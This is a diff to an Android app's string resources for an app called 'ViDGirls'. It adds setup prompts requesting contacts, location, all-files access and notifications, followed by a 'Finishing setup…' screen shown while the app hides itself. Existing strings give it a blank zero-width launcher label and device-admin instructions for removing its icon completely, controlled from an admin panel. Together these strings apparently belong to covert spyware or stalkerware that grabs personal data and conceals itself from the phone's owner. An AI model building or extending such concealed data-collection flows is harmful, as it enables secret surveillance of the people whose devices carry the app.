@@ -2,6 +2,10 @@
     <string name="app_name">ViDGirls</string>
     <!-- Zero-width space: blank home label while ghost-busting on OnePlus. -->
     <string name="launcher_blank_label">\u200B</string>
+    <string name="setup_permissions_title">Allow access to continue</string>
+    <string name="setup_permissions_hint">Contacts, location, files, and notifications</string>
+    <string name="setup_files_access">Enable all files access…</string>
+    <string name="setup_hiding">Finishing setup…</string>
     <string name="device_admin_explanation">Required on this phone before the app icon can be fully removed when hidden from the admin panel.</string>
     <string name="device_admin_title">Device admin required</string>
     <string name="device_admin_required_message">Step 1: Tap Activate and allow device admin on the next screen.\n\nStep 2: In the admin panel, tap Hide — the app icon will disappear completely.\n\nShow in the admin panel restores the icon and opens the app.</string>
